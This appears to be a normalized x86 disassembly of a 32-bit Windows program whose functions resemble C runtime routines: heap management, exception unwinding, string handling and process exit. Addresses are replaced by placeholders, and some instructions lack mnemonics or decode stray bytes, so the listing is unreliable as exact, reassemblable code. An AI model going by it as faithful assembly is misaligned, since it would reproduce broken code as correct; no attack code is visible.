push ebx
push 0xffffffff
push [ ebp + 0x8 ]
xor eax eax
mov [ ebx ] ax
push eax
push eax
call [ MultiByteToWideChar@IAT ]
push ebx
call [ SysAllocString@IAT ]
call [ lstrlenA@IAT ]
push eax
push esi
call [ SysAllocStringByteLen@IAT ]
jmp r-xdata
call sub_41a429
test eax eax
mov [ edi + 0x8 ] eax
jne r-xdata
sub_40b88b
cmp [ esp + 0x8 ] 0xb
mov eax ecx
jne r-xdata
mov cx [ esp + 0x4 ]
mov [ eax ] 0x2
mov [ eax + 0x8 ] cx
cmp [ esp + 0x4 ] 0x0
mov [ eax ] 0xb
jne r-xdata
or [ eax + 0x8 ] 0xffff
jmp r-xdata
and [ eax + 0x8 ] 0x0
jmp r-xdata
retn 0x8
sub_40b8c1
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0xa
mov eax ecx
jne r-xdata
cmp [ ebp + 0xc ] 0xb
jne r-xdata
mov [ eax ] 0xa
jmp r-xdata
mov [ eax ] 0x3
cmp [ ebp + 0x8 ] 0x0
mov [ eax ] 0xb
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x8 ] ecx
or [ eax + 0x8 ] 0xffff
jmp r-xdata
and [ eax + 0x8 ] 0x0
jmp r-xdata
pop ebp
retn 0x8
sub_40b903
mov edx [ esp + 0x8 ]
test edx edx
jne r-xdata
mov eax [ esp + 0x4 ]
cmp edx ecx
jne r-xdata
mov edx ecx
push eax
push 0x0
push edx
push ecx
call [ VariantChangeType@IAT ]
push eax
call sub_40b7d1
cmp ax [ ecx ]
je r-xdata
retn 0x8
sub_40b95b
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x8 ] 0x270f
push ebx
push esi
push edi
ja r-xdata
xor eax eax
mov di [ ebp + 0xc ]
push 0x1
pop esi
cmp di si
jb r-xdata
cmp di 0xc
ja r-xdata
test [ ebp + 0x8 ] 0x3
jne r-xdata
and [ ebp - 0x4 ] 0x0
movzx ecx [ ebp + 0x8 ]
mov eax ecx
push 0x64
cdq
pop ebx
idiv ebx
test edx edx
jne r-xdata
movzx ecx di
mov edi [ ecx * 4 + rw-data ]
movzx edx [ ebp + 0x10 ]
lea ecx [ ecx * 4 + rw-data ]
sub eax edi
mov [ ebp + 0x10 ] edx
add eax [ ecx ]
cmp edx eax
jg r-xdata
cmp [ ebp + 0x10 ] 0x1d
mov [ ebp - 0x4 ] esi
jne r-xdata
mov eax ecx
mov ecx 0x190
cdq
idiv ecx
test edx edx
jne r-xdata
cmp [ ebp + 0x14 ] 0x17
ja r-xdata
xor eax eax
cmp [ ebp + 0x10 ] si
jb r-xdata
cmp di 0x2
jne r-xdata
cmp [ ebp + 0x18 ] 0x3b
ja r-xdata
mov eax esi
jmp r-xdata
cmp [ ebp + 0x1c ] 0x3b
ja r-xdata
movzx esi [ ebp + 0x8 ]
mov eax esi
mov ebx 0x190
cdq
idiv ebx
mov ecx esi
push 0x64
shr ecx 0x2
add ecx eax
mov eax esi
imul eax eax 0x16d
add ecx eax
mov eax esi
cdq
pop esi
idiv esi
sub ecx eax
add ecx [ ebp + 0x10 ]
add ecx edi
cmp [ ebp + 0xc ] 0x2
ja r-xdata
movzx eax [ ebp + 0x14 ]
movzx edx [ ebp + 0x18 ]
imul eax eax 0x3c
add eax edx
sub ecx 0xa96c7
movzx edx [ ebp + 0x1c ]
imul eax eax 0x3c
add eax edx
mov [ ebp + 0x10 ] ecx
mov [ ebp + 0x8 ] eax
fild [ ebp + 0x8 ]
test ecx ecx
fmul [ r--data ]
jge r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
fild [ ebp + 0x10 ]
mov eax [ ebp + 0x20 ]
push 0x1
fadd st1
fstp [ eax ]
pop eax
fstp st0
jmp r-xdata
fchs
dec ecx
pop edi
pop esi
pop ebx
leave
retn 0x1c
sub_40ba98
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40b95b
neg eax
sbb eax eax
inc eax
mov [ esi + 0x8 ] eax
pop esi
pop ebp
retn 0x18
sub_40bae6
push esi
push edi
call sub_422d64
push 0xb
mov esi eax
call sub_4238a9
lea edi [ esi + 0x103c ]
push 0xb
call sub_423919
pop edi
pop esi
retn
push esi
mov ecx edi
call sub_4230fd
test esi esi
je r-xdata
mov esi [ edi ]
test esi esi
je r-xdata
mov eax [ esi ]
push 0x1
mov ecx esi
call [ eax ]
jmp r-xdata
sub_40bb34
cmp [ esp + 0x4 ] 0xffffffe0
ja r-xdata
xor eax eax
push [ esp + 0x4 ]
call sub_40bb60
test eax eax
pop ecx
jne r-xdata
retn
cmp [ esp + 0x8 ] eax
je r-xdata
push [ esp + 0x4 ]
call sub_40e7be
test eax eax
pop ecx
jne r-xdata
sub_40bb60
push esi
mov esi [ esp + 0x8 ]
cmp esi [ rw-data ]
push edi
ja r-xdata
test esi esi
jne r-xdata
push 0x9
call sub_40e83e
push esi
call sub_40ec48
push 0x9
mov edi eax
call sub_40e89f
add esp 0xc
test edi edi
je r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
push 0x1
pop esi
mov eax edi
jmp r-xdata
pop edi
pop esi
retn
sub_40bbae
push esi
call sub_40c8ab
push [ rw-data ]
call sub_40daf5
mov edx [ rw-data ]
pop ecx
mov ecx [ rw-data ]
mov esi ecx
sub esi edx
add esi 0x4
cmp eax esi
jae r-xdata
mov eax [ esp + 0x8 ]
mov [ ecx ] eax
add [ rw-data ] 0x4
mov esi eax
push edx
call sub_40daf5
add eax 0x10
push eax
push [ rw-data ]
call sub_40c532
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ rw-data ]
sub ecx [ rw-data ]
mov [ rw-data ] eax
sar ecx 0x2
lea ecx [ eax + ecx * 4 ]
mov [ rw-data ] ecx
xor esi esi
jmp r-xdata
call sub_40c8b4
mov eax esi
pop esi
retn
sub_40bc3e
push 0x80
call sub_40bb22
test eax eax
pop ecx
mov [ rw-data ] eax
jne r-xdata
and [ eax ] 0x0
mov eax [ rw-data ]
mov [ rw-data ] eax
retn
push 0x18
call sub_40cb90
mov eax [ rw-data ]
pop ecx
sub_40bc6d
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
add eax 0xc
mov [ ebp - 0x4 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx - 0x4 ]
mov ebp [ ebp - 0x4 ]
jmp eax
sub_40bcaf
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
mov eax [ fs : 0x0 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] r-xdata
push 0x0
push [ ebp + 0xc ]
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call RtlUnwind
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
and al 0xfd
mov ecx [ ebp + 0xc ]
mov [ ecx + 0x4 ] eax
mov eax [ fs : 0x0 ]
mov ebx [ ebp - 0x8 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_40bcfe
push ebp
mov ebp esp
sub esp 0x4
push ebx
push esi
push edi
cld
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40f3f3
add esp 0x20
mov [ ebp + 0x14 ] eax
pop edi
pop esi
pop ebx
mov eax [ ebp + 0x14 ]
mov esp ebp
pop ebp
retn
sub_40bd34
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0xc ]
and [ ebp - 0x14 ] 0x0
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x10 ] sub_40bd88
inc eax
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_40fc10
mov ecx eax
mov eax [ ebp - 0x14 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_40bd88
push ebp
mov ebp esp
cld
mov eax [ ebp + 0xc ]
push 0x0
push eax
push [ eax + 0x10 ]
push [ eax + 0x8 ]
push 0x0
push [ ebp + 0x10 ]
push [ eax + 0xc ]
push [ ebp + 0x8 ]
call sub_40f3f3
add esp 0x20
pop ebp
retn
sub_40bdad
push ebp
mov ebp esp
sub esp 0x34
push ebx
push esi
push edi
and [ ebp - 0x28 ] 0x0
mov [ ebp - 0x24 ] sub_40be63
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x14 ] eax
and [ ebp - 0x10 ] 0x0
and [ ebp - 0xc ] 0x0
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] r-xdata
mov [ ebp - 0xc ] esp
mov [ ebp - 0x8 ] ebp
mov eax [ fs : 0x0 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x34 ] 0x1
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x2c ] eax
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_40fcc3
call [ eax + 0x68 ]
pop ecx
pop ecx
and [ ebp - 0x34 ] 0x0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x28 ]
mov [ fs : 0x0 ] eax
mov ebx [ fs : 0x0 ]
mov eax [ ebx ]
mov ebx [ ebp - 0x28 ]
mov [ ebx ] eax
mov [ fs : 0x0 ] ebx
jmp r-xdata
mov eax [ ebp - 0x34 ]
pop edi
pop esi
pop ebx
leave
retn
sub_40be63
push ebp
mov ebp esp
push ebx
push esi
push edi
cld
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
test eax eax
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x8 ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push [ ebp + 0x8 ]
call sub_40f3f3
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
push 0x1
pop eax
jmp r-xdata
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp [ ebx + 0x18 ]
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_40bcaf
pop edi
pop esi
pop ebx
pop ebp
retn
sub_40bed8
push ebp
mov ebp esp
push ecx
push ebx
push esi
cmp [ ebp + 0xc ] 0x0
push edi
mov edi [ ebp + 0x8 ]
mov esi [ edi + 0xc ]
mov ebx [ edi + 0x10 ]
mov eax esi
mov [ ebp + 0x8 ] esi
mov [ ebp - 0x4 ] eax
jl r-xdata
mov ecx [ ebp + 0x14 ]
inc esi
mov [ ecx ] esi
mov ecx [ ebp + 0x18 ]
mov [ ecx ] eax
cmp eax [ edi + 0xc ]
ja r-xdata
cmp esi 0xffffffff
jne r-xdata
call sub_40fd8b
cmp esi eax
jbe r-xdata
mov ecx [ ebp + 0x10 ]
dec esi
lea eax [ esi + esi * 4 ]
cmp [ ebx + eax * 4 + 0x4 ] ecx
lea eax [ ebx + eax * 4 ]
jge r-xdata
call sub_40fd8b
lea eax [ esi + esi * 4 ]
pop edi
pop esi
lea eax [ ebx + eax * 4 ]
pop ebx
leave
retn
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
cmp [ ebp + 0xc ] 0x0
jge r-xdata
mov eax [ ebp + 0x8 ]
dec [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov [ ebp + 0x8 ] esi
mov eax [ ebp - 0x4 ]
sub_40bf54
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40bf96
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push eax
push 0xfffffffe
push sub_40bf74
push [ fs : 0x0 ]
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
cmp esi [ esp + 0x24 ]
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0x8 ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_40c02a
call [ ebx + esi * 4 + 0x8 ]
mov eax [ esp + 0x20 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_40c042
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] 0x42
push eax
lea eax [ ebp - 0x20 ]
push [ ebp + 0xc ]
mov [ ebp - 0x1c ] 0x7fffffff
push eax
call sub_40fef9
add esp 0xc
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_40fde1
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
and [ eax ] 0x0
jmp r-xdata
mov eax esi
pop esi
leave
retn
sub_40c094
push esi
mov esi [ esp + 0x8 ]
push edi
or edi 0xffffffff
test [ esi + 0xc ] 0x40
je r-xdata
push esi
call sub_4107bf
push esi
call sub_40c0c5
push esi
mov edi eax
call sub_410811
add esp 0xc
and [ esi + 0xc ] 0x0
jmp r-xdata
mov eax edi
pop edi
pop esi
retn
sub_40c0c5
push esi
mov esi [ esp + 0x8 ]
push edi
or edi 0xffffffff
test [ esi + 0xc ] 0x83
je r-xdata
and [ esi + 0xc ] 0x0
mov eax edi
pop edi
pop esi
retn
push esi
call sub_41099c
push esi
mov edi eax
call sub_410943
push [ esi + 0x10 ]
call sub_410863
add esp 0xc
test eax eax
jge r-xdata
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
or edi 0xffffffff
jmp r-xdata
push eax
call sub_40c218
and [ esi + 0x1c ] 0x0
pop ecx
sub_40c111
push ebx
push ebp
push esi
push edi
mov edi [ esp + 0x14 ]
movzx eax [ edi ]
mov ecx [ rw-data ]
mov al [ ecx + eax * 2 ]
and eax 0x8
movzx eax [ edi ]
push 0x8
push eax
call sub_410aa5
pop ecx
pop ecx
jmp r-xdata
movzx esi [ edi ]
inc edi
cmp esi 0x2d
mov ebp esi
je r-xdata
inc edi
jmp r-xdata
test eax eax
je r-xdata
movzx esi [ edi ]
inc edi
cmp esi 0x2b
jne r-xdata
cmp [ rw-data ] 0x1
jle r-xdata
mov eax [ rw-data ]
mov al [ eax + esi * 2 ]
and eax 0x4
push 0x4
push esi
call sub_410aa5
pop ecx
pop ecx
jmp r-xdata
xor ebx ebx
cmp ebp 0x2d
mov eax ebx
jne r-xdata
lea eax [ ebx + ebx * 4 ]
lea ebx [ esi + eax * 2 - 0x30 ]
movzx esi [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
neg eax
cmp [ rw-data ] 0x1
jle r-xdata
sub_40c1a7
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
call sub_4107bf
lea eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_410b54
push [ ebp + 0x8 ]
mov esi eax
call sub_410811
add esp 0x14
mov eax esi
pop esi
pop ebp
retn
sub_40c1d4
push esi
call sub_411775
mov esi eax
test esi esi
jne r-xdata
push edi
push esi
push [ esp + 0x18 ]
push [ esp + 0x18 ]
push [ esp + 0x18 ]
call sub_411605
push esi
mov edi eax
call sub_410811
add esp 0x14
mov eax edi
pop edi
pop esi
retn
pop esi
retn
sub_40c218
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
push 0x9
call sub_40e83e
push esi
call sub_40e8f2
pop ecx
test eax eax
pop ecx
je r-xdata
push 0x9
call sub_40e89f
pop ecx
push esi
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
push esi
push eax
call sub_40e91d
push 0x9
call sub_40e89f
add esp 0xc
pop esi
retn
sub_40c260
mov ecx [ esp + 0xc ]
push edi
test ecx ecx
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
push esi
push ebx
mov ebx ecx
mov esi [ esp + 0x14 ]
test esi 0x3
mov edi [ esp + 0x10 ]
jne r-xdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
dec ecx
je r-xdata
shr ecx 0x2
jne r-xdata
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test al al
je r-xdata
mov edx 0x7efefeff
mov eax [ esi ]
add edx eax
xor eax 0xffffffff
xor eax edx
mov edx [ esi ]
add esi 0x4
test eax 0x81010100
je r-xdata
jmp r-xdata
test edi 0x3
je r-xdata
test esi 0x3
jne r-xdata
mov [ edi ] edx
add edi 0x4
dec ecx
je r-xdata
test dl dl
je r-xdata
mov al [ esi ]
inc esi
mov [ edi ] al
inc edi
test al al
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
mov [ edi ] al
inc edi
dec ecx
je r-xdata
mov ebx ecx
shr ecx 0x2
jne r-xdata
and ebx 0x3
je r-xdata
xor edx edx
mov [ edi ] edx
test dh dh
je r-xdata
dec ebx
jne r-xdata
dec ebx
jne r-xdata
xor eax eax
mov [ edi ] al
inc edi
mov eax [ esp + 0x10 ]
pop ebx
pop esi
pop edi
retn
test edi 0x3
jne r-xdata
and ebx 0x3
jne r-xdata
and edx 0xff
mov [ edi ] edx
jmp r-xdata
test edx 0xff0000
je r-xdata
pop ebx
pop esi
mov [ edi ] eax
add edi 0x4
dec ecx
jne r-xdata
add edi 0x4
xor eax eax
dec ecx
je r-xdata
and edx 0xffff
mov [ edi ] edx
jmp r-xdata
test edx 0xff000000
jne r-xdata
mov [ edi ] edx
jmp r-xdata
sub_40c35e
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
call sub_40fcc3
push 0x8
mov [ ebp + 0xc ] eax
pop ecx
xor eax eax
lea edi [ ebp - 0x20 ]
push 0x7
[ edi ]
pop edi
mov dl [ esi ]
mov bl 0x1
movzx ecx dl
mov eax ecx
and ecx edi
shr eax 0x3
shl bl cl
lea eax [ ebp + eax - 0x20 ]
or [ eax ] bl
inc esi
test dl dl
jne r-xdata
mov edx [ ebp + 0x8 ]
test edx edx
jne r-xdata
mov al [ edx ]
push 0x1
movzx esi al
mov ecx esi
pop ebx
and ecx edi
shl ebx cl
shr esi 0x3
mov cl [ ebp + esi - 0x20 ]
test cl bl
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ eax + 0x18 ]
mov ebx edx
test al al
je r-xdata
mov eax [ ebp + 0xc ]
pop edi
pop esi
mov [ eax + 0x18 ] edx
mov eax ebx
sub eax edx
neg eax
sbb eax eax
and eax ebx
pop ebx
leave
retn
movzx esi al
mov ecx esi
push 0x1
and ecx edi
pop eax
shl eax cl
shr esi 0x3
mov cl [ ebp + esi - 0x20 ]
test cl al
jne r-xdata
inc edx
jmp r-xdata
and [ edx ] 0x0
inc edx
inc edx
jmp r-xdata
mov al [ edx ]
test al al
je r-xdata
sub_40c410
mov ecx [ esp + 0x8 ]
push edi
push ebx
push esi
mov dl [ ecx ]
mov edi [ esp + 0x10 ]
test dl dl
je r-xdata
mov eax edi
pop esi
pop ebx
pop edi
retn
mov dh [ ecx + 0x1 ]
test dh dh
je r-xdata
xor eax eax
pop esi
pop ebx
pop edi
mov al dl
jmp r-xdata
mov esi edi
mov ecx [ esp + 0x14 ]
mov al [ edi ]
inc esi
cmp al dl
je r-xdata
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
mov al [ esi ]
inc esi
cmp al dh
jne r-xdata
test al al
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
inc edx
cmp cl bl
je r-xdata
cmp al dl
je r-xdata
lea edi [ esi - 0x1 ]
pop esi
pop ebx
pop edi
xor eax eax
retn
mov al [ esi ]
inc esi
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
test cl cl
je r-xdata
test al al
jne r-xdata
lea eax [ edi - 0x1 ]
pop esi
pop ebx
pop edi
retn
mov al [ esi ]
add esi 0x2
cmp al ah
jne r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
mov al [ ecx + 0x3 ]
test al al
je r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
mov ah [ esi - 0x1 ]
add ecx 0x2
cmp al ah
je r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
mov ah [ ecx + 0x2 ]
test ah ah
je r-xdata
jmp r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_40c490
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x1c ] eax
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x20 ]
push [ ebp + 0x10 ]
push eax
call sub_40fef9
add esp 0xc
dec [ ebp - 0x1c ]
mov esi eax
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push 0x0
call sub_40fde1
pop ecx
pop ecx
mov eax [ ebp - 0x20 ]
and [ eax ] 0x0
jmp r-xdata
mov eax esi
pop esi
leave
retn
sub_40c4f0
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
sub_40c532
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_40bb22
pop ecx
jmp r-xdata
xor edi edi
cmp esi 0xffffffe0
ja r-xdata
push ebx
call sub_40c218
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x0
je r-xdata
push 0x9
call sub_40e83e
push ebx
call sub_40e8f2
pop ecx
mov [ ebp + 0xc ] eax
test eax eax
pop ecx
je r-xdata
mov eax edi
push esi
call sub_40e7be
test eax eax
pop ecx
jne r-xdata
push 0x9
call sub_40e89f
test esi esi
pop ecx
jne r-xdata
cmp esi [ rw-data ]
ja r-xdata
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push ebx
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov edi eax
push 0x1
pop esi
test esi esi
jne r-xdata
push esi
push ebx
push eax
call sub_40f0fd
add esp 0xc
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
je r-xdata
push 0x1
pop esi
push esi
call sub_40ec48
mov edi eax
pop ecx
test edi edi
je r-xdata
mov edi ebx
jmp r-xdata
push 0x9
call sub_40e89f
pop ecx
jmp r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
mov eax [ ebx - 0x4 ]
dec eax
cmp eax esi
jb r-xdata
test edi edi
jne r-xdata
test edi edi
jne r-xdata
push eax
push ebx
push edi
call sub_40ce30
push ebx
push [ ebp + 0xc ]
call sub_40e91d
add esp 0x14
mov eax esi
push eax
push ebx
push edi
call sub_40ce30
push ebx
push [ ebp + 0xc ]
call sub_40e91d
add esp 0x14
mov eax esi
sub_40c66c
push esi
inc ebx
xor dh [ eax ]
pop eax
inc ebx
xor [ eax ] dh
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
push ebp
cld
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
push ebp
lea ebp [ ebx + 0x10 ]
push 0xffffffff
push ebx
call sub_40bf96
add esp 0x8
pop ebp
mov eax 0x1
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov [ ebx - 0x4 ] eax
mov esi [ ebx + 0xc ]
mov edi [ ebx + 0x8 ]
mov eax 0x1
jmp r-xdata
lea ecx [ esi + esi * 2 ]
cmp [ edi + ecx * 4 + 0x4 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebx + 0x8 ]
lea ecx [ esi + esi * 2 ]
mov esi [ edi + ecx * 4 ]
jmp r-xdata
push esi
push ebp
lea ebp [ ebx + 0x10 ]
call [ edi + ecx * 4 + 0x4 ]
pop ebp
pop esi
mov ebx [ ebp + 0xc ]
or eax eax
je r-xdata
cmp esi 0xffffffff
je r-xdata
js r-xdata
mov eax 0x0
jmp r-xdata
mov edi [ ebx + 0x8 ]
push ebx
call sub_40bf54
add esp 0x4
lea ebp [ ebx + 0x10 ]
push esi
push ebx
call sub_40bf96
add esp 0x8
lea ecx [ esi + esi * 2 ]
push 0x1
mov eax [ edi + ecx * 4 + 0x8 ]
call sub_40c02a
mov eax [ edi + ecx * 4 ]
mov [ ebx + 0xc ] eax
call [ edi + ecx * 4 + 0x8 ]
sub_40c74c
push esi
mov esi [ esp + 0x8 ]
push edi
push esi
call sub_4107bf
dec [ esi + 0x4 ]
pop ecx
js r-xdata
push esi
call sub_41190c
pop ecx
mov edi eax
mov eax [ esi ]
movzx edi [ eax ]
inc eax
mov [ esi ] eax
jmp r-xdata
push esi
call sub_410811
pop ecx
mov eax edi
pop edi
pop esi
retn
sub_40c790
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
xor eax eax
or ecx 0xffffffff
[ edi ]
inc ecx
neg ecx
dec edi
mov al [ ebp + 0xc ]
std
[ edi ]
inc edi
cmp [ edi ] al
je r-xdata
mov eax edi
xor eax eax
jmp r-xdata
cld
pop edi
leave
retn
sub_40c806
push edi
call sub_40c8ab
push 0x1
pop edi
cmp [ rw-data ] edi
jne r-xdata
cmp [ esp + 0xc ] 0x0
push ebx
mov ebx [ esp + 0x14 ]
mov [ rw-data ] edi
mov [ rw-data ] bl
jne r-xdata
push [ esp + 0x8 ]
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
push rw-data
push rw-data
call sub_40c8bd
pop ecx
pop ecx
test ebx ebx
pop ebx
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push [ esp + 0x8 ]
mov [ rw-data ] edi
call [ ExitProcess@IAT ]
call sub_40c8b4
pop edi
retn
push rw-data
push rw-data
call sub_40c8bd
pop ecx
pop ecx
mov ecx [ rw-data ]
push esi
lea esi [ ecx - 0x4 ]
cmp esi eax
jb r-xdata
pop esi
mov eax [ esi ]
test eax eax
je r-xdata
sub esi 0x4
cmp esi [ rw-data ]
jae r-xdata
call eax
sub_40c8d7
push ebp
mov ebp esp
push esi
push [ ebp + 0x14 ]
call sub_4107bf
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40c906
push [ ebp + 0x14 ]
mov esi eax
call sub_410811
add esp 0x18
mov eax esi
pop esi
pop ebp
retn
sub_40c906
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
